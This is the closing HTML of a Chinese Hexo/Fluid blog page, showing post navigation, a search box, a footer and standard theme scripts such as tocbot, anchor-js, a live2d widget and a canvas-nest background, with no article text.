                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/11/21/%E9%9D%B6%E5%9C%BA/" title="靶场">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">靶场</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/09/16/%E5%81%A5%E8%BA%AB/" title="健身">
                        <span class="hidden-mobile">健身</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>



  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>




  
<script src="/z2z_custom/custom.js"></script>
<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/runtime.min.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/assets/tororo.model.json"},"display":{"position":"right","width":240,"height":480},"mobile":{"show":false},"react":{"opacityDefault":1,"opacityOnHover":1},"log":false,"tagMode":false});</script></body>
</html>



<!--动态线条背景-->
<script type="text/javascript"
color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
</script>


<!-- 页面点击小红心，在末尾添加，避免找不到 -->
<script type="text/javascript" src="/js/click.js"></script>


